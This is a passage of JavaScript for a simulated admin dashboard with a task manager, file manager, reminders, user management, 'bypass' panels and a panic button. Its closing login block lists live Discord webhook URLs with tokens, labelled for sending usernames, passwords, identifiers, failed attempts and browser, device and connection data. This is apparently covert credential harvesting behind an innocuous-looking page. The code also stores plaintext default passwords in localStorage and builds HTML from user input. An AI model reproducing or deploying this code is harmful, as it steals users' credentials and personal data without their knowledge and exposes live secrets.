        const ctx = this.refs.notesCanvas.getContext('2d');
        ctx.clearRect(0, 0, this.refs.notesCanvas.width, this.refs.notesCanvas.height);
        // Redraw background
        ctx.fillStyle = this.refs.body.classList.contains('light-theme') ? '#f0f0f0' : '#1f1f1f';
        ctx.fillRect(0, 0, this.refs.notesCanvas.width, this.refs.notesCanvas.height);
        this.addLog('Canvas cleared successfully.', 'debug');
      },
      
      exportNotes: function() {
        const link = document.createElement('a');
        link.download = 'my_notes_canvas.png';
        link.href = this.refs.notesCanvas.toDataURL('image/png');
        link.click();
        this.addLog('Canvas exported as PNG.', 'info');
      },
      
      takeScreenshot: function() {
        const elementToCapture = document.getElementById('dashboard'); // Capture the entire dashboard
        html2canvas(elementToCapture).then(canvasImg => {
          const link = document.createElement('a');
          link.download = 'dashboard_capture.png';
          link.href = canvasImg.toDataURL('image/png');
          link.click();
          this.addLog('Dashboard screenshot taken.', 'info');
        }).catch(err => {
          console.error("Screenshot failed:", err);
          this.addLog('Failed to take dashboard screenshot.', 'error');
        });
      },
      
      toggleNotesCanvas: function() {
        if (this.refs.canvasContainer.style.display === 'none') {
          this.refs.mainGrid.style.display = 'none';
          this.refs.canvasContainer.style.display = 'block';
          this.refs.notesBtn.innerText = '‚¨ÜÔ∏è Hide Notes Canvas';
          this.addLog('Notes canvas opened.', 'info');
        } else {
          this.refs.canvasContainer.style.display = 'none';
          this.refs.mainGrid.style.display = 'flex';
          this.refs.notesBtn.innerText = 'üìí Notes Canvas';
        }
      },
      
      toggleMainSections: function() {
          if (this.refs.mainGrid.style.display === 'none') {
              this.refs.mainGrid.style.display = 'flex';
              this.refs.toggleSectionsBtn.innerText = '‚¨ÜÔ∏è Toggle Main Sections';
              this.addLog('Main sections shown.', 'info');
          } else {
              this.refs.mainGrid.style.display = 'none';
              this.refs.toggleSectionsBtn.innerText = '‚¨áÔ∏è Show Main Sections';
          }
      },
      
      runDiagnostics: function() {
        // Simulate running diagnostics
        this.addLog('Starting system diagnostics...', 'debug');
        this.showNotification('Running diagnostics...');
        setTimeout(() => {
          // Check simulated statuses
          let issuesFound = false;
          if (this.state.currentCPU > 90) { this.addLog('WARN: High CPU usage detected.', 'warn'); issuesFound = true; }
          if (this.state.currentRAM > 85) { this.addLog('WARN: High RAM usage detected.', 'warn'); issuesFound = true; }
          if (this.state.currentDisk > 95) { this.addLog('ERROR: Disk space critically low.', 'error'); issuesFound = true; }
          if (this.state.tasks.length > 50) { this.addLog('WARN: Excessive number of running tasks.', 'warn'); issuesFound = true; }

          if (issuesFound) {
            this.showNotification('Diagnostics complete. Some warnings/errors found. Check logs.');
          } else {
            this.showNotification('Diagnostics complete. System health nominal.');
            this.addLog('Diagnostics completed: No critical issues found.', 'info');
          }
        }, 2500); // Simulate diagnostic time
      },
      
      toggleFullScreen: function() {
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen().catch(err => {
            this.showNotification(`Error entering fullscreen: ${err.message}`, 'error');
            this.addLog(`Fullscreen error: ${err.message}`, 'error');
          });
          this.refs.fullScreenBtn.innerText = '‚Ü©Ô∏è Exit Full Screen';
          this.state.isFullscreen = true;
        } else {
          document.exitFullscreen();
          this.refs.fullScreenBtn.innerText = 'üñ•Ô∏è Full Screen';
          this.state.isFullscreen = false;
        }
      },
      
      zoomIn: function() {
        if (this.state.zoomLevel < 2) {
          this.state.zoomLevel += 0.1;
          document.body.style.zoom = this.state.zoomLevel;
          this.addLog(`Zoom level increased to ${Math.round(this.state.zoomLevel * 100)}%.`, 'debug');
        }
      },

      zoomOut: function() {
        if (this.state.zoomLevel > 0.5) {
          this.state.zoomLevel -= 0.1;
          document.body.style.zoom = this.state.zoomLevel;
          this.addLog(`Zoom level decreased to ${Math.round(this.state.zoomLevel * 100)}%.`, 'debug');
        }
      },
      
      restartPage: function() {
        if (confirm('Are you sure you want to reload the dashboard? This will reset current session data.')) {
          this.addLog('Page reload initiated.', 'info');
          window.location.reload();
        }
      },
      
      panicAction: function() {
        // Simulate a panic action - e.g., opening a specific website or closing sensitive info
        // As per original code, opening clever.com
        this.addLog('PANIC button activated!', 'warn');
        window.open('https://clever.com', '_blank'); // Redirect to a safe-ish page
        // Optionally, clear canvas or hide sensitive data
        this.clearCanvas();
        this.toggleMainSections(); // Hide content
        this.refs.announcementBar.innerHTML = '<span>üö® PANIC ACTION ENGAGED! PROCEED WITH CAUTION. üö®</span>';
        // This would ideally trigger a logout or wipe session data
      },
      
      // Initialize panels (ensure they are hidden and content reset)
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => panel.style.display = 'none');
        document.querySelectorAll('.ipad-content').forEach(content => content.style.display = 'none');
        document.querySelectorAll('.bypass-content').forEach(content => content.style.display = 'none');
      },
      
      // Toggle visibility of information panels
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        const allPanels = document.querySelectorAll('.info-panel');
        
        // Hide all other panels first, unless it's the same panel being toggled
        allPanels.forEach(p => {
          if (p.id !== panelId && p.style.display === 'block') {
            p.style.display = 'none';
          }
        });

        // Toggle the target panel
        if (panel.style.display === 'none' || panel.style.display === '') {
          panel.style.display = 'block';
          this.addLog(`Panel "${panelId}" opened.`, 'info');
        } else {
          panel.style.display = 'none';
          this.addLog(`Panel "${panelId}" closed.`, 'info');
        }
      },
      
      // Show content within specific panels like iPad
      showIpadContent: function(contentId) {
        const parentPanel = this.refs.ipadPanel; // Assuming this is called within context of iPad panel
        parentPanel.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetContent = parentPanel.querySelector(`#ipad${contentId.charAt(0).toUpperCase() + contentId.slice(1)}`);
        if (targetContent) {
          targetContent.style.display = 'block';
          this.addLog(`iPad content "${contentId}" shown.`, 'info');
        }
      },
      
      showBypassContent: function(contentId) {
        const bypassPanel = this.refs.bypassPanel;
        bypassPanel.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetContent = bypassPanel.querySelector(`#${contentId}Bypass`);
        if (targetContent) {
          targetContent.style.display = 'block';
          this.addLog(`Bypass content "${contentId}" shown.`, 'info');
        }
      },
      
      // Utility to add log entries to the System Logs panel
      addLog: function(message, type = 'info') {
        const logEntry = document.createElement('div');
        logEntry.className = `log-entry ${type}`;
        logEntry.textContent = `[${new Date().toLocaleTimeString()}] [${type.toUpperCase()}] ${message}`;
        this.refs.logViewer.prepend(logEntry); // Add to the top of the list

        // Limit number of logs displayed to prevent performance issues
        while (this.refs.logViewer.children.length > 100) {
          this.refs.logViewer.removeChild(this.refs.logViewer.lastChild);
        }
      },
      
      // Show temporary notifications (like status messages)
      showNotification: function(message, type = 'info') {
        const notif = document.createElement('div');
        notif.className = `notification ${type}`;
        notif.textContent = message;
        document.body.appendChild(notif); // Append to body for visibility
        
        // Auto-remove notification after a few seconds
        setTimeout(() => {
          notif.remove();
        }, 5000);
      },

      // Initialize System Monitoring
      initSystemMonitoring: function() {
        this.updateSystemMonitoring();
        this.monitorUpdateInterval = setInterval(() => {
          this.updateSystemMonitoring();
        }, this.config.updateInterval);
      },
      
      updateSystemMonitoring: function() {
        // Simulate fluctuations
        const cpuDelta = (Math.random() - 0.4) * 15; // -7.5 to +7.5
        const ramDelta = (Math.random() - 0.4) * 100; // -50 to +50 MB
        const diskDelta = (Math.random() - 0.3) * 5; // -1.5 to +3.5 GB
        const netDelta = (Math.random() - 0.5) * 100; // -50 to +50 Mbps

        this.state.currentCPU = Math.max(0, Math.min(this.config.maxCPU, this.state.currentCPU + cpuDelta));
        this.state.currentRAM = Math.max(0, Math.min(this.config.maxRAM, this.state.currentRAM + ramDelta));
        this.state.currentDisk = Math.max(0, Math.min(this.config.maxDisk, this.state.currentDisk + diskDelta));
        this.state.currentNet = Math.max(0, Math.min(this.config.maxNet, this.state.currentNet + netDelta));

        // Update progress bars
        this.updateProgressBar(this.refs.cpuUsageBar, this.state.currentCPU, this.config.maxCPU, 'CPU');
        this.updateProgressBar(this.refs.ramUsageBar, this.state.currentRAM, this.config.maxRAM, 'RAM');
        this.updateProgressBar(this.refs.diskUsageBar, this.state.currentDisk, this.config.maxDisk, 'Disk');
        this.updateProgressBar(this.refs.netSpeedBar, this.state.currentNet, this.config.maxNet, 'Network');
      },
      
      updateProgressBar: function(element, value, max, label) {
        if (!element) return;
        const percentage = (value / max) * 100;
        element.style.width = `${percentage}%`;
        element.textContent = `${Math.round(value)}${label === 'Network' ? ' Mbps' : label === 'RAM' ? ' MB' : '%'}`; // Adjust text based on label

        // Update class for color coding
        element.classList.remove('high', 'critical');
        if (percentage > 85) element.classList.add('critical');
        else if (percentage > 70) element.classList.add('high');
      },

      // Initialize Task Manager
      initTaskManager: function() {
        this.generateInitialTasks();
        this.renderTasks();
        this.taskUpdateInterval = setInterval(() => {
          this.updateTasks();
          this.renderTasks();
        }, this.config.taskUpdateInterval);
      },
      
      generateInitialTasks: function() {
        const processNames = [
          'System Idle Process', 'svchost.exe', 'dwm.exe', 'explorer.exe',
          'chrome.exe', 'msedge.exe', 'notepad.exe', 'cmd.exe',
          'audiodg.exe', 'RuntimeBroker.exe', 'SystemSettings.exe', 'taskmgr.exe',
          'msmpeng.exe', 'WMI Provider Host', 'nvcontainer.exe', 'wininit.exe',
          'csrss.exe', 'LogonUI.exe', 'fontdrvhost.exe'
        ];
        for (let i = 0; i < 15; i++) {
          const name = processNames[Math.floor(Math.random() * processNames.length)];
          const pid = 100 + Math.floor(Math.random() * 1000);
          const cpu = parseFloat((Math.random() * 5).toFixed(1));
          const mem = Math.floor(Math.random() * 200) + 10; // 10-200 MB
          this.state.tasks.push({ id: i, name, pid, cpu, mem, running: true });
        }
      },
      
      updateTasks: function() {
        this.state.tasks.forEach(task => {
          if (!task.running) return;
          // Simulate CPU/Memory fluctuations
          const cpuChange = (Math.random() - 0.4) * 1.5; // -0.75 to +0.75
          const memChange = (Math.random() - 0.5) * 30; // -15 to +15 MB
          task.cpu = Math.max(0.1, task.cpu + cpuChange);
          task.mem = Math.max(5, task.mem + memChange);
        });
      },
      
      renderTasks: function() {
        this.refs.taskTableBody.innerHTML = ''; // Clear existing tasks
        this.state.tasks.filter(task => task.running).forEach(task => {
          const row = document.createElement('tr');
          row.innerHTML = `
            <td>${task.name}</td>
            <td>${task.pid}</td>
            <td>${task.cpu.toFixed(1)}%</td>
            <td>${task.mem.toFixed(0)} MB</td>
            <td class="task-actions">
              <button onclick="dashboard.killTask(${task.id})" title="End Task">‚úñÔ∏è</button>
            </td>
          `;
          this.refs.taskTableBody.appendChild(row);
        });
      },
      
      killTask: function(taskId) {
        const task = this.state.tasks.find(t => t.id === taskId);
        if (task) {
          task.running = false;
          this.addLog(`Task "${task.name}" (PID: ${task.pid}) terminated.`, 'info');
          // Re-render the tasks list to remove the killed task
          this.renderTasks();
          // Optionally, show a "Task killed" notification
        }
      },
      
      handleNewTaskSubmit: function(e) {
        e.preventDefault();
        const name = this.refs.taskName.value.trim();
        const cpu = parseFloat(this.refs.taskCpu.value);
        const mem = parseInt(this.refs.taskMemory.value);

        if (!name || isNaN(cpu) || isNaN(mem)) {
          alert('Please fill in all fields correctly.');
          return;
        }

        const newTask = {
          id: Date.now(), // Simple unique ID
          name: name,
          pid: Math.floor(Math.random() * 9000) + 1000, // Random PID
          cpu: cpu,
          mem: mem,
          running: true
        };
        this.state.tasks.push(newTask);
        this.renderTasks();
        this.addLog(`New task "${name}" added.`, 'info');
        this.closeModal();
        this.refs.newTaskForm.reset();
      },

      // Initialize File Manager
      initFileManager: function() {
        this.generateInitialFiles();
        this.renderFileList();
      },
      
      generateInitialFiles: function() {
        this.state.files = [
          { id: 'root', name: '/', type: 'folder', path: '/', children: [
              { id: 'docs', name: 'Documents', type: 'folder', path: '/Documents', children: [
                  { id: 'doc1', name: 'Meeting Minutes.docx', type: 'file', path: '/Documents/Meeting Minutes.docx', size: '1.5MB', lastModified: '2024-07-25' },
                  { id: 'report', name: 'Quarterly Report.pdf', type: 'file', path: '/Documents/Quarterly Report.pdf', size: '5.2MB', lastModified: '2024-07-20' }
              ]},
              { id: 'proj', name: 'Projects', type: 'folder', path: '/Projects', children: [
                  { id: 'proj1', name: 'Project Alpha Plan.txt', type: 'file', path: '/Projects/Project Alpha Plan.txt', size: '50KB', lastModified: '2024-07-22' }
              ]},
              { id: 'readme', name: 'README.md', type: 'file', path: '/README.md', size: '2KB', lastModified: '2024-07-26' },
              { id: 'config', name: 'config.sys', type: 'file', path: '/config.sys', size: '10KB', lastModified: '2024-07-26' }
          ]}
        ];
      },
      
      renderFileList: function() {
        this.refs.fileListRoot.innerHTML = ''; // Clear existing list
        const currentDir = this.findDirectoryByPath(this.state.currentPath);
        if (!currentDir || !currentDir.children) return;

        this.refs.currentPathDiv.innerText = `Path: ${this.state.currentPath}`;

        // Add parent directory link
        if (this.state.currentPath !== '/') {
            const parentDir = this.getParentPath(this.state.currentPath);
            const parentListItem = document.createElement('li');
            parentListItem.innerHTML = `<span class="icon">‚¨ÜÔ∏è</span> .. (Parent Directory)`;
            parentListItem.addEventListener('click', () => this.changeDirectory(parentDir));
            this.refs.fileListRoot.appendChild(parentListItem);
        }

        currentDir.children.forEach(item => {
          const listItem = document.createElement('li');
          const iconClass = item.type === 'folder' ? 'folder' : 'file';
          const icon = item.type === 'folder' ? 'üìÅ' : 'üìÑ';
          listItem.innerHTML = `<span class="icon">${icon}</span> ${item.name}`;
          
          if (item.type === 'folder') {
            listItem.addEventListener('click', () => this.changeDirectory(item.path));
          } else {
            listItem.addEventListener('click', () => this.openFile(item));
          }
          this.refs.fileListRoot.appendChild(listItem);
        });
      },
      
      findDirectoryByPath: function(path) {
        // Simple recursive search for directory object
        const find = (dir, targetPath) => {
            if (dir.path === targetPath) return dir;
            if (dir.type === 'folder' && dir.children) {
                for (const child of dir.children) {
                    if (child.type === 'folder') {
                        const found = find(child, targetPath);
                        if (found) return found;
                    }
                }
            }
            return null;
        };
        return find(this.state.files[0], path); // Start search from root
      },

      getParentPath: function(path) {
        if (path === '/') return '/';
        const parts = path.split('/').filter(p => p !== '');
        parts.pop(); // Remove last part
        return '/' + parts.join('/');
      },
      
      changeDirectory: function(newPath) {
        this.state.currentPath = newPath;
        this.renderFileList();
        this.addLog(`Changed directory to: ${newPath}`, 'debug');
      },
      
      openFile: function(file) {
        // For simplicity, simulate opening by showing details or just logging
        this.addLog(`Attempting to open file: ${file.name}`, 'info');
        if (file.type === 'file') {
            // In a real app, this might open an editor or display content.
            // Here, we just simulate the action.
            alert(`Opened: ${file.name}\nSize: ${file.size}\nModified: ${file.lastModified}`);
        }
      },
      
      handleNewFolderSubmit: function(e) {
        e.preventDefault();
        const folderName = this.refs.folderName.value.trim();
        if (!folderName) {
          alert('Folder name cannot be empty.');
          return;
        }

        const currentDir = this.findDirectoryByPath(this.state.currentPath);
        if (!currentDir) {
          alert('Error: Could not find current directory.');
          this.closeModal();
          return;
        }

        // Check if folder already exists
        if (currentDir.children.some(item => item.name === folderName && item.type === 'folder')) {
          alert('A folder with this name already exists in this directory.');
          return;
        }

        const newFolder = {
          id: Date.now().toString(),
          name: folderName,
          type: 'folder',
          path: `${this.state.currentPath === '/' ? '' : this.state.currentPath}/${folderName}`,
          children: []
        };
        currentDir.children.push(newFolder);
        this.renderFileList();
        this.addLog(`Created new folder: ${newFolder.path}`, 'info');
        this.closeModal();
        this.refs.fmNewFolderForm.reset();
      },
      
      handleFileUpload: function() {
        // Simulate file upload prompt
        const fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.onchange = (e) => {
            const files = e.target.files;
            if (files.length > 0) {
                const file = files[0];
                const currentDir = this.findDirectoryByPath(this.state.currentPath);
                if (currentDir) {
                    const newFile = {
                        id: Date.now().toString(),
                        name: file.name,
                        type: 'file',
                        path: `${this.state.currentPath === '/' ? '' : this.state.currentPath}/${file.name}`,
                        size: `${(file.size / 1024).toFixed(2)} KB`, // Simple size representation
                        lastModified: new Date(file.lastModified).toISOString().split('T')[0] // YYYY-MM-DD
                    };
                    currentDir.children.push(newFile);
                    this.renderFileList();
                    this.addLog(`Uploaded file: ${newFile.path}`, 'info');
                }
            }
        };
        fileInput.click();
      },
      
      // Initialize Reminder System
      initReminderSystem: function() {
        this.loadReminders();
        this.renderReminders();
        this.reminderCheckInterval = setInterval(() => this.checkReminders(), this.config.reminderCheckInterval);
      },
      
      addReminder: function() {
        const message = this.refs.reminderMessage.value.trim();
        const dateTime = this.refs.reminderDateTime.value;

        if (!message || !dateTime) {
          alert('Please enter both a message and a date/time for the reminder.');
          return;
        }

        const reminderDate = new Date(dateTime);
        const now = new Date();

        if (reminderDate <= now) {
          alert('The reminder date and time must be in the future.');
          return;
        }

        const newReminder = {
          id: Date.now(),
          message: message,
          dateTime: reminderDate.toISOString()
        };
        this.state.reminders.push(newReminder);
        this.saveReminders();
        this.renderReminders();
        this.addLog(`Reminder set: "${message}" for ${reminderDate.toLocaleString()}.`, 'info');
        this.refs.reminderMessage.value = '';
        this.refs.reminderDateTime.value = '';
      },
      
      removeReminder: function(id) {
        this.state.reminders = this.state.reminders.filter(r => r.id !== id);
        this.saveReminders();
        this.renderReminders();
        this.addLog(`Reminder with ID ${id} removed.`, 'info');
      },
      
      renderReminders: function() {
        this.refs.reminderList.innerHTML = ''; // Clear existing
        this.state.reminders.sort((a, b) => new Date(a.dateTime) - new Date(b.dateTime)); // Sort by date
        
        this.state.reminders.forEach(reminder => {
          const item = document.createElement('li');
          item.className = 'reminder-item';
          const reminderDateTime = new Date(reminder.dateTime);
          item.innerHTML = `
            <div class="details">
              <strong>${reminder.message}</strong>
              <span>${reminderDateTime.toLocaleString()}</span>
            </div>
            <button class="delete-btn" onclick="dashboard.removeReminder(${reminder.id})" title="Delete Reminder">&times;</button>
          `;
          this.refs.reminderList.appendChild(item);
        });
      },
      
      saveReminders: function() {
        localStorage.setItem('dashboardReminders', JSON.stringify(this.state.reminders));
      },
      
      loadReminders: function() {
        const savedReminders = localStorage.getItem('dashboardReminders');
        if (savedReminders) {
          this.state.reminders = JSON.parse(savedReminders);
          // Filter out past reminders that haven't triggered yet (optional, but good practice)
          this.state.reminders = this.state.reminders.filter(r => new Date(r.dateTime) > new Date());
        }
      },
      
      checkReminders: function() {
        const now = new Date();
        const triggeredReminders = [];
        
        this.state.reminders.forEach(reminder => {
          const reminderTime = new Date(reminder.dateTime);
          if (reminderTime <= now) {
            triggeredReminders.push(reminder);
            // Display notification
            alert(`REMINDER: ${reminder.message}`); // Simple alert for now
            this.addLog(`REMINDER triggered: "${reminder.message}".`, 'warn');
          }
        });
        
        // Remove triggered reminders from the list
        if (triggeredReminders.length > 0) {
          this.state.reminders = this.state.reminders.filter(r => !triggeredReminders.find(tr => tr.id === r.id));
          this.saveReminders();
          this.renderReminders();
        }
      },
      
      // Initialize System Logs
      initSystemLogs: function() {
        // Add some initial logs
        this.addLog('System initialized. Dashboard loaded.', 'info');
        this.addLog('Network connectivity established.', 'debug');
        this.addLog('User authentication module ready.', 'info');
        // Start interval for generating fake logs
        this.logInterval = setInterval(() => {
          const types = ['info', 'warn', 'error', 'debug'];
          const messages = [
            'Processing user request...', 'Checking system health...', 'Cache cleared.',
            'Potential anomaly detected.', 'Resource allocation adjustment.', 'Network packet loss detected.',
            'Login attempt failed.', 'Invalid input received.', 'Critical error: Core process failed.'
          ];
          const type = types[Math.floor(Math.random() * types.length)];
          const message = messages[Math.floor(Math.random() * messages.length)];
          this.addLog(message, type);
        }, this.config.logInterval);
      },
      
      // Initialize User Management
      initUserManagement: function() {
        // Load users from a simulated source (or localStorage if persistence is desired)
        // For this example, we'll use localStorage for persistence of users.
        this.loadUsers();
        this.renderUserTable();
      },
      
      loadUsers: function() {
        const usersFromStorage = localStorage.getItem('dashboardUsers');
        if (usersFromStorage) {
          this.state.users = JSON.parse(usersFromStorage);
        } else {
          // Default users if none saved
          this.state.users = [
            { id: 1, username: 'admin', password: 'password123', userId: 'ADMIN001', role: 'Admin', rank: 'Level 5' },
            { id: 2, username: 'user1', password: 'userpass', userId: 'USR789', role: 'User', rank: 'Level 2' },
            { id: 3, username: 'guest', password: 'guestpass', userId: 'GST123', role: 'Guest', rank: 'Level 1' }
          ];
        }
      },
      
      saveUsers: function() {
        localStorage.setItem('dashboardUsers', JSON.stringify(this.state.users));
      },
      
      renderUserTable: function() {
        this.refs.userTableBody.innerHTML = '';
        this.state.users.forEach(user => {
          const row = document.createElement('tr');
          row.innerHTML = `
            <td>${user.username}</td>
            <td>${user.userId}</td>
            <td>${user.role}</td>
            <td>${user.rank}</td>
            <td class="user-actions">
              <button title="Edit User" onclick="dashboard.editUser(${user.id})">‚úèÔ∏è</button>
              <button title="Delete User" onclick="dashboard.deleteUser(${user.id})" class="delete">üóëÔ∏è</button>
            </td>
          `;
          this.refs.userTableBody.appendChild(row);
        });
      },
      
      addUser: function() {
        const username = this.refs.newUserUsername.value.trim();
        const password = this.refs.newUserPassword.value.trim();
        const userId = this.refs.newUserID.value.trim();
        const role = this.refs.newUserRole.value;
        const rank = this.refs.newUserRank.value.trim();

        if (!username || !password || !userId) {
          alert('Username, Password, and User ID are required.');
          return;
        }
        if (this.state.users.some(u => u.username === username || u.userId === userId)) {
          alert('User with this username or User ID already exists.');
          return;
        }

        const newUser = {
          id: Date.now(),
          username: username,
          password: password,
          userId: userId,
          role: role,
          rank: rank
        };
        this.state.users.push(newUser);
        this.saveUsers();
        this.renderUserTable();
        this.addLog(`User "${username}" added.`, 'info');
        // Clear form
        this.refs.newUserUsername.value = '';
        this.refs.newUserPassword.value = '';
        this.refs.newUserID.value = '';
        this.refs.newUserRole.value = 'User';
        this.refs.newUserRank.value = '';
      },
      
      editUser: function(userId) {
        alert(`Edit user functionality not fully implemented. User ID: ${userId}`);
        // In a real app, this would open a modal to edit user details.
      },
      
      deleteUser: function(userId) {
        if (confirm('Are you sure you want to delete this user? This action cannot be undone.')) {
          const initialCount = this.state.users.length;
          this.state.users = this.state.users.filter(u => u.id !== userId);
          if (this.state.users.length < initialCount) {
            this.saveUsers();
            this.renderUserTable();
            this.addLog(`User with ID ${userId} deleted.`, 'info');
          } else {
            alert('User not found.');
          }
        }
      },
      
      // Initialize Advanced Settings
      initAdvancedSettings: function() {
        // Settings are loaded via loadSettings() and applied on change via saveSettings()
      },
      
      // Initialize Network Utilities
      initNetworkUtilities: function() {
        // Initial messages
        this.addLog('Network utilities initialized.', 'debug');
      },
      
      simulatePing: function() {
        const target = this.refs.pingTarget.value.trim();
        if (!target) {
          alert('Please enter a target host or IP address.');
          return;
        }
        this.addLog(`Pinging ${target}...`, 'debug');
        this.refs.pingOutput.innerHTML = '<p class="log-entry debug">Pinging...</p>';
        
        // Simulate ping response
        setTimeout(() => {
          const success = Math.random() > 0.2; // 80% success rate
          if (success) {
            const latency = Math.floor(Math.random() * 100) + 1; // 1-100ms
            this.refs.pingOutput.innerHTML = `<p class="log-entry info">Reply from ${target}: bytes=32 time=${latency}ms TTL=64</p>`;
            this.addLog(`Ping successful to ${target}: ${latency}ms`, 'info');
          } else {
            this.refs.pingOutput.innerHTML = `<p class="log-entry error">Request timed out.</p>`;
            this.addLog(`Ping failed to ${target}: Request timed out.`, 'error');
          }
        }, 1500 + Math.random() * 1000); // Simulate network latency
      },
      
      simulateTrace: function() {
        const target = this.refs.traceTarget.value.trim();
        if (!target) {
          alert('Please enter a target host or IP address.');
          return;
        }
        this.addLog(`Tracing route to ${target}...`, 'debug');
        this.refs.traceOutput.innerHTML = '<p class="log-entry debug">Tracing route...</p>';
        
        // Simulate traceroute hops
        let hopCount = 0;
        const maxHops = 10 + Math.floor(Math.random() * 5); // 10-15 hops
        const traceInterval = 500; // ms between hops
        let traceOutputHtml = '';

        const traceIntervalId = setInterval(() => {
          hopCount++;
          if (hopCount > maxHops || hopCount > 15) { // Stop after max hops or max safety hops
            clearInterval(traceIntervalId);
            this.refs.traceOutput.innerHTML = traceOutputHtml;
            this.addLog(`Traceroute to ${target} completed.`, 'info');
            return;
          }
          
          const hopNum = hopCount;
          const ipAddress = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
          const rtt1 = Math.floor(Math.random() * 50) + 1;
          const rtt2 = Math.floor(Math.random() * 50) + 1;
          const rtt3 = Math.floor(Math.random() * 50) + 1;
          
          traceOutputHtml += `<p class="log-entry info">${hopNum} <span class="ping-result">${ipAddress}</span> ${rtt1}ms ${rtt2}ms ${rtt3}ms</p>`;
          this.refs.traceOutput.innerHTML = traceOutputHtml;
          this.refs.traceOutput.scrollTop = this.refs.traceOutput.scrollHeight; // Scroll to bottom
          
          if (hopCount === maxHops) { // If last hop
              this.addLog(`Traceroute to ${target} completed in ${hopCount} hops.`, 'info');
          }
        }, traceInterval);
      },
      
      // Modal utility functions
      openModal: function(modal) {
        if (this.state.activeModal) {
            this.closeModal(); // Ensure only one modal is open at a time
        }
        modal.style.display = 'flex';
        this.state.activeModal = modal;
        document.body.style.overflow = 'hidden'; // Prevent background scrolling
      },
      
      closeModal: function() {
        if (this.state.activeModal) {
          this.state.activeModal.style.display = 'none';
          this.state.activeModal = null;
          document.body.style.overflow = 'auto'; // Restore background scrolling
          // Reset form content if needed
          if (this.refs.newTaskForm) this.refs.newTaskForm.reset();
          if (this.refs.fmNewFolderForm) this.refs.fmNewFolderForm.reset();
        }
      },
      
      // Load initial data (simulated)
      loadInitialData: function() {
        // Mock login data for demonstration purposes (in real app, this is fetched)
        // Mock data is handled by the login script.
        // Dashboard will initialize its own simulated data here.
        
        // Initialize monitoring values
        this.state.currentCPU = this.config.initialCPU;
        this.state.currentRAM = this.config.initialRAM;
        this.state.currentDisk = this.config.initialDisk;
        this.state.currentNet = this.config.initialNet;
      },

      // Logout
      logout: function() {
        if (confirm('Are you sure you want to log out?')) {
          this.addLog('User logged out.', 'info');
          // Reset dashboard state
          clearInterval(this.sessionTimerInterval);
          clearInterval(this.clockInterval);
          clearInterval(this.monitorUpdateInterval);
          clearInterval(this.taskUpdateInterval);
          clearInterval(this.logInterval);
          clearInterval(this.reminderCheckInterval);

          // Hide dashboard, show login
          this.refs.dashboard.style.display = 'none';
          this.refs.loginBox.style.display = 'block';
          document.body.className = 'login-body';
          document.body.style.zoom = '1'; // Reset zoom
          this.state.zoomLevel = 1;
          this.state.isFullscreen = false;
          
          // Potentially clear sensitive data from memory if needed.
        }
      }
    };

    // Login System JavaScript
    (() => {
      // Original webhooks (unchanged)
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };
      // New logging webhooks
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
        // Webhooks for reset box and result
        resetBoxDetected: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq',
        resetCodeResult: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB' // Accepted
        // 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip' // Incorrect
      };

